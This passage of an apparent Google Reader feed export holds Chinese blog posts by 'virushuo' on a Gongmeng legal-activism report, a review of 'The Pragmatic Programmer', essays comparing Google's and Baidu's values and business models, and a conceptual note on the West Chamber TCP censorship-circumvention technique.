推动律协直选的意义和方法研讨会，7月26日，与北京传知行社会经济研究所共同合办。<br>\n◎周正龙虎照案，10月19日。<br>\n三、公民参与<br>\n◎推动北京市律师协会直选项目<br>\n2008年6月，公盟与多名律师合作，对台湾、香港、美国等律协选举制度进行研究，积极宣传律民主选举，希望通过各界律师的合作推动北京律协的民主选举。<br>\n8月下旬，律师们起草了《顺应历史潮流，实现律协直选----致全体北京律师、市司法局、市律协的呼吁》和《北京律师协会选举程序（草案）》等文章，这些文章在网络上迅速传播，引起了法律界关注，受到了各界律师的支持。9月中旬，参与推动北京市律师协会直选项目的律师们为了听取更多律师的意见和建议，向北京市近16000名律师分别发出了信函。9月12日北京律协公布律协章程征求意见稿。同日，直选律师们向北京全体律师发出了《竞选律师代表的策略和建议》。9月13日，直选律师开办的《律师沙龙》网站开通运行。10月24日，直选律师之一李方平等发表公开信，对全国律协七大律师代表的产生缺乏合法性和民主性提出质疑。11月，向北京市司法局和北京市律协发出《关于敦促律协换届审计并公开财务的公开信》。12月20日，北京市律师协会七届五次代表大会召开，会议审议通过了《北京市律师协会章程》。推动直选的律师们对此提出了质疑。<br>\n◎政府信息公开项目<br>\n公盟关注关注并支持了以下信息公开申请及后续行政诉讼：<br>\n北京市海淀区市民朱福祥、湛江向北京市海淀区环境保护局、海淀区四季青镇政府依法申请部分工程相关的政府信息公开；<br>\n北京市昌平区市民陈育华向北京市公安局依法申请公开2003年至今的养犬管理费用使用情况；<br>\n郝劲松申请陕西省林业厅公开虎照案相关信息；<br>\n海淀区四季青镇居民兰靖远向海淀区四季青镇政府申请一项关于集体土地被占用的相关信息公开。<br>\n◎对电信、网通网络封锁的共同诉讼<br>\n2007年初，上海居民杜冬劲上网时发现自己在海外注册的一家网站无法正常访问，但该网站实际上当时正常运营。因此，杜冬劲起诉上海电信，他要求被告明确告知自己的网站为何不能通过国内互联网登陆，并按照合同赔偿两个月宽带使用费和诉讼举证费用，但一审败诉，二审再次败诉。公盟一直关注此案。<br>\n李方平诉中国网通北京公司反垄断案。<br>\n四、民声频道<br>\n民声频道旨在关注遭遇不公正的个体，发布来自公民社会的声音。以案情报道的方式，放大个体微弱的声音，以获得社会公众的关注；以公民来信的方式，刊登公民对法治和社会改革提出的理性建设性意见和建议。<br>\n◎编写了\"北京海淀区苏家坨镇163户拆迁户质疑住房周转金过低\"的民声频道文章，并对此类事件进行了简要分析。<br>\n◎ 3月收到河南省洛阳市人郭克哲家属以及贵州省铜仁市茶店镇开天村村民杨鑫家属的上访材料，分别反应郭克哲、杨鑫在看守所羁押期间意外身亡。<br>\n◎3月，经过对近年公盟收到的相关羁押期间犯罪嫌疑人死亡事件的整理，编写了\"危险的看守所----犯罪嫌疑人在看守所频繁死亡\"的民声频道。<br>\n◎ 4月，北京市海淀区北京体育大学南侧西洼村居民反应，2006年当地拆迁征地过程中拆迁单位欺骗居民。根据材料公盟编写了民声频道文章并进行深入调查，参与了居民与政府部门的协商，政府部门初步同意为拆迁户解决实际问题。<br>\n四、法律研究<br>\n选择中国前沿的法律问题进行调查研究，提出改革意见和立法建议。<br>\n◎ 2005-2007中国新闻自由度观察报告（2008年）<br>\n◎推动《公民权利与政治权利国际公约》的批准和履行研究报告（2007年-2008年）<br>\n◎户籍制度改革及北京新市民居住制度改革研究（2007年-2008年）<br>\n◎征收法立法草案（2007-2008年）<br>\n五、其他工作<br>\n◎2008年度十大法治事件评点<br>\n◎公民责任奖。\"公民责任奖\"是公盟于2008年启动的一项民间权利保障促进项目。其宗旨是鼓励公共精神和公民责任。首届公民责任奖获得者如下：韩寒、简光洲、丘建东，获得提名奖的为：郝劲松、韦东英、陈光标、陈育华、刘绍坤。</p>\n\n<p>2009年度（部分，简要）<br>\n继续为三聚氰胺奶粉事件的受害者提供援助。<br>\n关注精神病强制收容问题。孙东东事件后召开研讨会。<br>\n邓玉娇案发生后，派出律师为邓玉娇提供法律援助。<br>\n上访者姚晶北欧驻京办殴打致伤严重，许志永撰文呼吁并提供法律援助。<br>\n网友捐款，公盟建立法律援助基金。...<br>\n信息公开项目负责人杨慧文律师向北京73家政府部门申请公开\"三公消费\"和\"本部门所有收入支出具体情况\"。<br>\n完成西藏34事件社会经济成因调查报告，并寄往有关政府部门。<br>\n完成公民维权手册。<br>\n公盟开展第一期法律知识培训。<br>\n关注\"汉中屠狗事件\"，召开研讨会。<br>\n关注非北京户籍学生的教育权问题。</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370772547",
    "timestampUsec" : "1313370772547327",
    "id" : "tag:google.com,2005:reader/item/f3c048783ad5677e",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "读读书，写写字" ],
    "title" : "谈谈《程序员修炼之道》",
    "published" : 1249662613,
    "updated" : 1249664943,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2009/08/08/post_68.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>学过高中物理的人，应该会记得，原子中的电子获得能量之后，将发生能级跃迁，到达更高的能量状态。其实任何工种都是一样的，要跳出自己的水平，到达更高的级别，不是件容易的事，这个跳跃过程总需要一些东西的辅助。诚然，如果要成为一个好人，那么只要做好在幼儿园中学到的一切就足够。如果要成为一个好程序员，所需要的道理也不太多，只不过，当水平不够的时候，永远不能认识到那些朴素道理的重要。而当水平达到的时候，这些道理自然会明白。所以一本帮助程序员进阶的书，很容易落到低手觉得是废话，高手也觉得是废话的悲惨境地。</p>\n\n<p>很多年以前，有人和我推荐过这本《程序员修炼之道》，甚至专门买了一本送到我家。而当年的我，不知道是由于无知，自负，浮躁，或是其他，只草草翻了一下，就下了个\"烂书\"的定义，扔在书架一角。后来有朋友在我书架上发现，如获至宝，说已经买不到了。我当然乐得送了人情。在我心目中，最好的入门书永远是《代码大全》，那也是对我影响最深的一部书。</p>\n\n<p>过了很多年之后，再来谈这本书，发现很多人的评价比我高的多，自知不妙，赶快找来重读，这才知道错过了什么。在一个滥俗的译名之下，在一个看起来不知所云的目录之后，在一些读起来拗口的句子之中，隐藏的竟然是相当伟大的思想，朴素而真挚，简单而有效。这时候我突然明白，这是一本不逊于《代码大全》的伟大著作，后者一直被我誉为\"新手圣经\"。</p>\n\n<p>经验这个东西，往往并不能告诉我们什么一定对，但是可以告诉我们什么一定不对。这本书完全是经验凝成，没有大道理，没有新观念。这些朴素的道理就是创造一个合格软件和作一个好程序员所必须了解的。比如 \"提示44 不要靠巧合编程\"，这句话表达的意思是\"不要预设立场\"。听起来简单，但是只要随手翻翻你最新写过的一段程序，通常都会发现代码中做了大量的\"假设\"。书中用一道习题，假设了用户使用命令行环境，假设用户懂英语....都可能导致问题。怕了吧？幸好还有\"提示30 你不可能写出完美的软件\"，这可不是帮你开脱责任，而是在讲如何控制需求，这正是能顺利完成一个项目的根本前提，可惜事实上往往到了项目失败的时候，人们才想起来需求出了问题。</p>\n\n<p>这本书涉猎的范围相当广，如何设计架构，如何思考问题，如何测试，如何编码，如何处理文档...如果细心琢磨，构建软件的所有主干和细微枝节都有所涉及。和很多人的看法不同，我不认为这是一本可以轻松读完的书。一方面，这本书涉及的内容太多，虽然已经尽量讲述，但所有话题都可以继续引申出无限的内容，如果用心，还可以配合附录中所提到的各种论文和资源继续学习。习题也需要仔细思考。这绝不是一本小说。另一方面，作者用了大量的隐喻，导致读起来有一定难度。开始我认为是翻译质量有问题，不过慢慢发现美国的读者读起来也未必容易。原因还是涉及到的范围过大。我特意模仿这种风格写了本文的第一段。虽然是中文，读起来也不容易吧。</p>\n\n<p>相信以上的两点会阻挡一部分人阅读这本书。我也算是曾经受阻的人之一。 不过，好书并不会随着时间的推移和平台变化而消亡，好书只会成为经典。无论是《人月神话》，还是《代码大全》，都在时间的长河中沉淀下来，传颂至今。这本书，虽然历史只有10年，不过现在再来翻看，不仅毫不落伍，甚至感觉穿透了时间，看到了这些年中不少自己犯过的错误，我相信这也是一本能经的起时间沉淀的书，只不过需要多点耐心。因此，我郑重的写下这篇书评，希望再能读到这本书的人多一点耐心，越过语言的障碍，直入本质，直至跃向更高级别。这个希望，不仅仅是对新手说的，其实也包括我自己。如本书开头所说：注重实效的程序员应该不断学习。我们都应该不断的学习下去。</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370769366",
    "timestampUsec" : "1313370769366209",
    "id" : "tag:google.com,2005:reader/item/f88a390660e99168",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "随便" ],
    "title" : "Google百度和谷歌的那些事",
    "published" : 1263481146,
    "updated" : 1263649773,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2010/01/14/blog56google_blogtinyfool_1_go.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>很久不在这个blog上写和技术无关的东西了，尤其不想写跟业界有关的东西，觉得太空，太忽悠，对别人没价值。但这次，我想写写这5，6年对google和百度的一些观察心得。这里面，这里面存在大量的个人推论，我并不能担保完全正确，请只当作是一次思想的碰撞。</p>\n\n<p>这篇blog主要由我完成，<a href=\"http://tiny4.org/myhome/\">Tinyfool</a>提出了大量修改意见，亦有重要贡献。</p>\n\n<p><big><strong>1 google，不作恶，信息流动</strong></big></p>\n\n<p>众所周知，google的目标是\"整合全球信息\"。从另外一个角度看来，这可以看作加快信息流动。信息流动变快是有巨大的经济价值的。加速，始终是人类经济活动的主线，快即是价值。从蒸汽时代到现在，每一次让移动速度加快的方式都造成了人类巨大的变化，只不过，在蒸汽和机械的时代，加快的是人和货物的移动，信息时代加快的是信息的流动。</p>\n\n<p>仔细观察，可以发现，很多事情不再需要实体物质的流动。比如，我们不再需要人去送一封信，而只需传递一封电子邮件。我们也不那么需要去订阅一份报纸送上家门，而只需要浏览门户网站。这是信息时代带来的改变。而Google所做的，是继续加快这种信息流动的速度，让人们需要的东西更快的呈现在眼前。</p>\n\n<p>Google始终坚持Pagerank排名，除了惩罚作弊者，并未干预过任何排名。这是因为，信息的正常流动才会加速，加速信息是Google的价值，也带来巨大的经济价值。Google绝对不允许把广告插入到搜索结果中。否则搜索结果质量会下降-&gt;用户不满意-&gt;搜索量降低-&gt;广告点击降低，最终仍然造成收入下降。（后面我们会讲到百度完全不同的做法）</p>\n\n<p>投放过Adwords的同学会发现，并非价格越高越好，就算单价非常高，如果匹配度很低，广告点击率就会很低。这样Google仍然会降低这种匹配的出现频率。这样就避免了在A在B的搜索结果中投放\"我是B\"的广告来误导用户。</p>\n\n<p>在这个体系下，有用的东西就是有用的，信息流动会变快，Google会推动这种信息变的更快，没用的东西就是垃圾，会阻碍信息流动，Google就让他变的更慢，直到被放弃。</p>\n\n<p>Don't be evil 这句口号，可以理解为东欧出生的布林对人生的追求，也可以理解为Google商业利益的准则。因为，越是不作恶，越是让信息有序，正常的流动，给Google带来的实际利益也就越大。很多人认为这只是一句作秀的口号，事实上这是商业和个人追求的双重准则。</p>\n\n<p><br>\n<big><strong>2 baidu，竞价排名，Google</strong></big></p>\n\n<p>百度显然看到了搜索的巨大价值，于是挤进了这个市场。我们且不论搜索质量，先看百度的利润来源。</p>\n\n<p>百度同样有右侧广告(类似Adwords)和左侧排名。左侧排名就是所谓的竞价排名，这是百度的\"创新\"。竞价排名是百度收入的主要来源(<a href=\"http://ir.baidu.com/phoenix.zhtml?c=188488&amp;p=irol-reportsAnnual\">注1</a>)。</p>\n\n<p>前面说过，竞价排名会干扰用户搜索体验，这大家都深有体验，某些热门关键词，百度前几页的结果都是竞价结果。那么为什么Google不敢这样做，而百度这样做就赚翻了呢？</p>\n\n<p>昨天我在twitter上说过一句话：\"<a href=\"http://twitter.com/virushuo/status/7729290302\">adsense是促使信息有序流动并盈利，竞价排名是破坏信息流动并盈利。也难怪两个公司的人看问题截然不同。</a>\"</p>\n\n<p>很多人有体验，如果你的搜索结果比较靠前，百度会有销售来找你做竞价排名，如果不做的话，很快你的搜索结果就骤减。这种\"巧合\"正好说明了阻碍信息流动也是可以盈利的。换言之，帮助别人照看孩子可以赚钱，威胁别人家孩子来收保护费也可以赚钱。</p>\n\n<p>那么，按照前面的说法，阻碍信息流动的应该会被用户抛弃，在百度这边为什么情况相反呢？</p>\n\n<p>搜索引擎的结果好坏实际很难评价，通常来说，\"好10%\"是完全没有意义的。这在这个市场上反复被证实，仅仅让搜索结果比对方好10%，或差10%，不会对用户体验影响太大。第二梯队中的搜狗，有道，搜索结果未必真的比百度差多少，但无论如何也无法翻身。同样的竞争也发生在了Google,Bing,Yahoo之间。换言之，搜索引擎产品是一种先入为主的产品。</p>\n\n<p>在百度起家的年代，Google遭遇了最严重的屏蔽。大家应该都有体验，在大公司内基本无法正常访问Google。我们且不去讨论这种屏蔽的始作俑者是否是百度(无论百度是否加快了这种行为，最终的结果也必然发生)。那几年，又正好是中国互联网用户增长最快的年代(<a href=\"http://news.xinhuanet.com/newmedia/2005-07/22/content_3251081.htm\">注2</a>)。大量的新互联网用户直接成为了百度的用户。</p>\n\n<p>搜索引擎市场上，\"获得第一批用户\"是至关重要的。</p>\n\n<p>比较百度和Google的产品和收购策略，百度通常收购能带来巨大流量的产品，包括hao123，天空软件站等等。而Google收购的通常是具有独特的技术，可产生独特数据的产品，比如Analytics,blogger。</p>\n\n<p>百度的主要企业运营行为是围绕\"获得第一批用户\"的。这些方法包括：工具条，hao123，和软件下载站合作等等。Google被屏蔽看作这种行为的反向手法，无论是否百度造就的，至少这个结果导致了百度获得了更多的第一批用户。</p>\n\n<p>在一个基本没有竞争对手的市场上，百度可以\"挟流量以令诸侯\"，这时候，他破坏一部分信息正常流动也不会造成太严重的后果。因为用户毫无比较。</p>\n\n<p>Google的铁杆用户分为两类。一类是早期用户，这部分用户用过Google，也用过百度。有明确的比较和鉴别能力。他们最终选择了Google。另外一类是专业用户，他们真的发现百度找不到他们需要的东西。这时候Google对比百度的优势大大增加，到达了用户满意程度的临界点，于是这部分用户也选择了Google。</p>\n\n<p>在中国互联网上，大部分用户偏重娱乐。这些用户很难分辨Google和百度的区别。甚至他们会觉得百度更好一些，因为百度提供了方便无比的MP3搜索。他们一旦先尝试了百度，那么就会留下，继续成为百度的用户。这就是我们今天看到的样子。</p>\n\n<p><br>\n<big><strong>3 谷歌做了什么</strong></big></p>\n\n<p>2006年，Google决定开设中国办公室，并命名为谷歌。这是Google创始以来，最大胆，也是最小心的尝试。他们从来没有过试图进入一个需要过滤某些内容的国家(如前所述，这是阻碍信息流动，同时也背叛了Google的价值观)。</p>\n\n<p>我们可以从一些细节看到Google的小心翼翼。比如，Google.cn是没有Google Account的。用户不能注册，也就没有密码，因此也就没有泄密之忧。后来有人嘲笑谷歌音乐可以用各种帐号登录，但就是不能用Google Account登录。所有需要登录的Google服务都没有进入中国。包括Gmail,Gtalk,Blogger等等等。</p>\n\n<p>Google从进入中国那一天，就给自己设置好了底限。这种底限，就是李开复所说的\"总部压力\"。</p>\n\n<p>李开复的谷歌，是谷歌，绝不是Google。是一个像百度的外企。</p>\n\n<p>3个字可以来概括谷歌几年的工作：\"倒流量\"。倒流量的工作由一系列的合作(迅雷，sina，天涯，265)完成。这和Google的传统做法完全不同，Google几乎不去主动谋求流量，产品质量会解决所有问题。但谷歌必须谋求流量，一个急进，喜欢去大学讲座和写书的职业经理人，不会有创始人那样的耐心慢慢的守着一个市场。这让谷歌越来越像百度。</p>\n\n<p>众所周知，用和对手一样的手段不可能打倒对手。</p>\n\n<p>谷歌推出的最重量级产品，是谷歌音乐。这显然是看到了百度在MP3搜索上获得的好处，意图获得以娱乐为主的用户。当然，鉴于Google全球的品牌，这些音乐需要有版权。我不评价这个产品的好坏，但这显然和Google总部习惯格格不入。难道Google不知道去做一个音乐下载产品吗？难道Google不能去做一个下载站吗？总部不去做，只不过是因为这和价值观不符。</p>\n\n<p>同样的价值观不符，还包括和天涯合作的来吧。之前说过，除了独特的数据，Google不会主动创造内容。以Google的胸怀，可以去索引百度贴吧和知道，并放在结果的显著位置，但没必要自己去模仿一个贴吧出来。这种竞争的水平太低了。</p>\n\n<p>甚至，谷歌把中国访问Google.com的流量\"劫持\"到了Google.cn，以便提高自己的\"占有率\"。这件事让很多Google老用户恼火，Zola曾经在某个李开复参与的活动中举手提问，如何才能在中国正常的访问Google.com。</p>\n\n<p>\"倒流量\"之后，谷歌的市场占有率有所上升。这是应该的。不过，新上升的占有率中，有多少是真正的搜索流量就不得而知了。正如百度搜索和贴吧等产品的比值是个秘密一样。</p>\n\n<p>百度跟在Google后面，而谷歌跟在百度后面。</p>\n\n<p>除了倒流量，谷歌也在\"抓收入\"。</p>\n\n<p>投放过Adsense的朋友，大概会记得，Adsense的匹配质量越来越差，医疗方面的内容也越来越多。之前经常有人因为作弊被封掉帐号，后来再也没人说过自己的帐号被封。</p>\n\n<p>我07年的两篇blog提到了这件事：<br>\n<a href=\"http://blog.devep.net/virushuo/2007/04/05/zhaigao-or-guge-adsense.html\">对不起，这是谷歌，不是google</a><br>\n<a href=\"http://blog.devep.net/virushuo/2007/04/19/remove_google_adsense.html\">去掉了blog上的google adsense</a></p>\n\n<p>这两个特点都不是Google Adsense应有的特性。Google Adsense应该是匹配准，不干扰用户，且提供有用信息。时常读英文内容的人会时常看到Adsense广告的匹配相当精确，时而有点击的必要。</p>\n\n<p>离开了这两个特点，可以把谷歌的广告看作一个大的广告联盟。这和拿了很多小网站的Banner的流量去找广告主谈价本质是一样的。在这种广告销售策略下，不需要匹配，不需要杜绝点击欺诈。最舍得花钱投这种广告的，无非是医疗，美容几类。</p>\n\n<p>这几类是最赚钱的部分。不仅对于谷歌，对于百度，甚至对电视台都是一样的。</p>\n\n<p>关于Adsense的故事，可以看看Tiny这篇文章 :<a href=\"http://tiny4.org/tinygoogle/2007/08/google-adsense.html\">我和Google Adsense那点故事</a></p>\n\n<p>在这5年中，最常被记者们提起的\"谷歌困境\"就是\"总部压力\"。在我列出的这些部分，都已经触及到了Google价值观，所以Google必然不满。</p>\n\n<p>有兴趣的同学可以对比一下2005~2010这5年，Google做了什么，谷歌做了什么。你会看到截然不同的项目。虽然结果看起来似乎都是：\"市场份额增加，收入增加\"，Google在这几年，砸实了搜索的基础，扩大了搜索的内容来源和范围，把索引伸向了非数字内容，完成了地图/卫星图/Earth/街景等一系列重要产品，完成了在移动和3G方面的布局。谷歌做了什么呢？音乐，热榜，还有一个抄袭的输入法。</p>\n\n<p>从谷歌存在的那天，我就写过一篇文章，核心意思是：要么把中国当作研发基地，投资，研发，但不运营，要么就干脆去印度开分公司。不幸言中。</p>\n\n<p><big><strong>4 孙云丰的观点</strong></big></p>\n\n<p>从商业价值和经济利益方面考量，都可以看出Google的不作恶，并不是作秀的口号。对于一个靠信息有序化赚钱的公司，必须要不作恶才行。百度正好相反，必须要作恶才行。</p>\n\n<p>Google是幸福的，可以把商业价值建立在一个正确的价值观之上。这确实是可遇不可求的机会。很不幸，百度不行。</p>\n\n<p><a href=\"http://tiny4.org/jsjy/sxl/2010/01/google.html\">孙云丰的言论</a>是无法自圆其说的。一方面，他认为Google不是人权斗士，只是个为了利润的市侩分子。另一方面，他又高举社会公平的大旗，宣称百度的道德感。这两者之间有明确的冲突。如果Google只为了利润，那么百度同样不应该有道德可言。</p>\n\n<p>一方面，他宣称自己观点毫无错误，另一方面，他又删掉了自己的文章。有人说删贴未必是他自己的意愿。那么，作为宣称\"有道德感\"的百度员工，他不应该屈从别人的意见删掉自己认为正确的东西。作为百度高管，不应该允许百度公关去打电话要求别人删贴。</p>\n\n<p>今天有一些百度员工为孙云丰辩护，这些说法同样无法自圆其说。试图证明百度是一家很好的公司，并不能证明孙云丰说的正确。正如纳粹德国有一支很有战斗力的军队，并不能证明希特勒是正义的。他们甚至自相矛盾，认为孙云丰对竞争对手恶言相对是正确的，其他人骂孙云丰是错。如果孙云丰代表自己骂了一家公司，该公司的用户有权回击。如果孙云丰代表百度，那他严重的缺乏职业道德。从任何角度，我也得不出百度员工和前员工的那些结论。</p>\n\n<p>当然，我从来也没认为过百度是一家很糟糕的公司，甚至很多次认为百度正在逐渐变成一家有责任感的公司。遗憾的是，从高管到员工，似乎都没和这家公司一样完成这种转变。</p>\n\n<p>不要以为这次事件打击了Google在中国的份额就幸灾乐祸，事实上，中国的互联网市场消失了。这和市场份额无关，和宏观形势有关。这个国家温情脉脉的互联网时代就此结束，就好比IT精英们看不起的那些传统生意人一样，慢慢被兼并，重组，消亡，剩下的那一点，会被扫倒利润微薄的边边角角。就好比，你家楼下菜市场那个可怜的菜农，守着那一点点收入，还要担心城管。这是这个行业中每个人的悲剧。</p>\n\n<p>Tinyfool说:百度的矛盾在于，Google的成功是他在全世界资本市场受宠的原因，但他们可能无时无刻不想google死掉会更好。在全世界范围内，这是不可能出现的，现在在中国出现了，他们真的会高兴吗？</p>\n\n<p>Google给我们的最大价值，除了信息流动加速，就是信息永存。当我写完这篇blog，发布在我的blog上，按下\"发布\"之后的几分钟，各种蜘蛛就会蜂拥而至，把这篇文章复制若干次，存在这世界的各个角落。这文章即永存。无法被某个组织控制或删除，也无法阻止其流动。公关公司不行，某个国家政府也不行。孙云丰的言论，和百度其他员工的言论，也将和这篇文章一样，被永存，成为历史的一部分。这是我们热爱Google的原因。</p>\n\n<p>现在，我要按下发布按钮了。</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370768881",
    "timestampUsec" : "1313370768881343",
    "id" : "tag:google.com,2005:reader/item/0156ea8daff3182d",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "随便" ],
    "title" : "搜索世界的两端",
    "published" : 1264306560,
    "updated" : 1264306922,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2010/01/24/post_70.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>这是给FTChinese写的稿子，发表于 <a href=\"http://www.ftchinese.com/story/001030941\">http://www.ftchinese.com/story/001030941</a></p>\n\n<p>所谓搜索世界的两端，一端是美国，一端是中国，一端是Google，一端是百度。如果眼下这些乱七八糟的事情继续坏下去，两端都会继续背离，越走越远。</p>\n\n<p>另外，我并非专业写评论的，只是个程序员。班门弄斧，博大家一笑。</p>\n\n<p>------------------------------------------------------------------------------------------</p>\n\n<p>在蒸汽机出现之前，就算用鞭子拼命抽打坐骑，也不能让速度变快一倍。机械时代开始之后，一切都变得不同，从铁路到航空，速度变快了数倍。在今天这个时代，现实中的运动速度已经基本到达上限。科技再发展10年，也未必能让飞机的速度再提高一倍。但网络可以。从第一次工业革命到现在，\"变快\"一直是人类经济活动的重要部分。</p>\n\n<p>网络传递的是数据，而非实体物质。在网络普及之前，传递一份文件尚可通过传真，但传递一段声音，一段影像，除了传递存储介质之外，别无他法。当网络把一切都数字化--电子邮件，电子文档，音频流，视频流之后，这些都变得简单了。人们发现，越来越多的东西无需传递实体物质，仅传递信息即可。简单来说，我们手写一封信通过邮局投寄，需要传递给对方的只是信的内容，并非信的实体。对方只要获知了信中的内容，并不需要拥有信封信纸之类的实体物质。网络通过让信息快速移动的方式，再次让人类的活动\"变快\"。</p>\n\n<p>互联网如同高速公路，四通八达。要想快速移动，只有路是不行的，还需要足够好的车。对于互联网来说，搜索引擎就是这辆车。搜索引擎帮助人们快速找到需要的东西，换言之，缩短了人和信息之间的距离。即使在互联网的时代，人们也从来没有这么方便过，一般来说，大部分需求，用不了半秒钟都可以得到满意的答复。搜索引擎缩短了人到信息的距离，广告也就接踵而来。这种广告也和以往大不相同，既然已经\"知道\"人需要的东西，于是便可毫不干扰用户的插入对应的广告。这种经过整理的广告，甚至可以被认为成信息的一种。你在找Macbook的价格？Google不仅告诉你价格，还告诉你哪在出售。这就是Google在前面10年中的主要工作。</p>\n\n<p>Google有个响亮的口号，叫做\"整合全球信息\"，其意图非常明显，只需获取更多的信息，进行整理，等着人们来使用，把广告放在合适的位置，其收入就会持续增长。Google根据页面之间的关系，创造了PageRank的排名方法，根据这种算法排序搜索结果，绝不允许被人工干扰，广告和搜索结果有严格明确的区分，放在搜索结果右侧，绝不混淆。Google尽量去选择并提供用户可能需要的，绝不干扰用户原本的筛选行为和结果。对应到现实世界，就好像建设覆盖更广的高速公路，帮助更多的人到达目的地，同时在路边树立广告牌。不干扰用户，只给用户需要的东西，无论是信息还是广告。对于这样一家公司，信息越多，流动越快，人们就越需要Google来整合信息，使用Google的次数也就越多。这也就意味着广告可以被展示更多，进而带来更多的点击，创造更多的利润。这家公司几乎是最近10年来信息流动最大的推动者，他们甚至希望把用户接入网络的ISP费用都免掉，以便让信息流动的更快。Google不仅\"不作恶\"，而且\"无需作恶\"。事实上，任何作恶行为（比如改变用户的搜索行为和结果）都会阻挡信息正常流动，最终受损害的不仅是用户的利益，更是Google的利益。 </p>\n\n<p>一个伟大的事业，不会只有一种盈利方法。在中国，其竞争对手百度，找到了另外一条道路。起初，百度和Google类似，也整合信息，缩短人和信息之间的距离。在百度的模式中，可以将一些付费的内容放在搜索结果页面中比较靠前的位置。这是一个相当有趣的平衡，百度同样希望缩短人和信息之间的距离，百度也需要用户点击他们提供的广告来获得盈利，他们比google走得远得多：他们将广告直接置入搜索结果，以鱼目混珠式的点击获得更快捷的盈利。这听起来有点像高速公路上的收费站。收费站当然不希望让高速公路完全拥堵，车辆仍然会在那里堵上个几分钟，缴纳过路费。甚至，他们只在乎过路费，并不太在意人们最终是否能够到达目的。几年前，百度特别热门的关键词搜索结果前几页都是付费广告，且没有任何标记，在这种情况下，人们很难利用百度找到有用的信息。一旦百度开始左右用户的搜索结果，就很难停下来，因为一旦停止，利润就会快速下跌。百度也在力图改变这个微妙的平衡，经过几年的努力，现在搜索结果中的广告会被标明\"推广\"，而且最热门的关键词，也只有半页的付费结果了。</p>\n\n<p>好的利润和坏的利润并不那么区别明显，何况，百度也在力图让自己的搜索结果更有用。但这仍不可避免的令公司陷入很多麻烦事中，前面的几年中，我们看到广告主，网站站长，代理商等各种角色对百度发泄过不满。百度是一家不错的公司，但他们确实很难和Google一样宣称自己\"Don't be evil\"，他们显然也并不相信这个。对于Google来说，IPO只是一个起点，甚至到今天，Google仍然还远远没有到达巅峰，对于这家伟大的公司来说，这颗星球上还有太多的信息需要被整合，下至传统出版物，上至人们随身携带的移动设备。这些都将逐渐成为Google广阔帝国的一部分，Google仍然在关注如何缩短人和信息的距离，让信息流动的更快。至于这些地方是否被树立上广告牌，那并非第一优先考虑的事情。但对于百度，利润永远是第一的，百度的平衡仍然会继续下去，他们将走向另外一种模式。也许再经过5年的时间，我们可以看到\"中国的Google\"变得和Google截然不同。</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370767071",
    "timestampUsec" : "1313370767071264",
    "id" : "tag:google.com,2005:reader/item/115ab7da10d8405f",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "胡言乱语" ],
    "title" : "&quot;原理小解&quot;读后感",
    "published" : 1268623766,
    "updated" : 1268624498,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2010/03/15/post_71.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>强烈推荐阅读youxu这篇<a href=\"http://blog.youxu.info/2010/03/14/west-chamber/\">原理分析</a>的文章，写得相当好懂，读的过程中解答了我两个疑问，读完想明白了，写这里做笔记了。</p>\n\n<p>一 墙是不是经过简单升级就可以对付西厢</p>\n\n<p>西厢其实并没有对墙做任何事，只是巧妙的利用了TCP协议的规则。正如墙利用了三次握手的不校验这个特点（这不是漏洞，而是特点）强行插入reset包一样，西厢也利用了这个特点，让客户端和服务器发送出了墙希望看到的数据包。这里的强大之处在于，一切都是在规则之内的。所以说，如果我们从更高的角度看来，墙和西厢是一种东西，TCP协议如果进行了校验，那就不会有西厢，同样也不会有墙。如果没有墙，也不会有西厢这种用法。</p>\n\n<p>二 墙能用什么办法来对付西厢</p>\n\n<p>TCP协议的三次握手而不校验，留下了可以被强行插入包这个弱点，产生了墙。这个地方这样处理的原因主要是为了性能。TCP是一种高性能协议，所以必须以信任为基础，不能做太多的干涉，否则性能就会大大下降。所以我们目前采用的TCP协议都不对包做什么校验。如前面所说，西厢同样利用了这个特点来获得所需要的数据包。墙如果想知道那些连接是真的断开，哪些是被西厢模拟断开，就必须维护连接状态，进行深度包检测。这样一来效率就会大大下降。众所周知，如果一个系统中存在一个点，可以令系统性能大大下降，会出现什么结果</p>\n\n<p>三 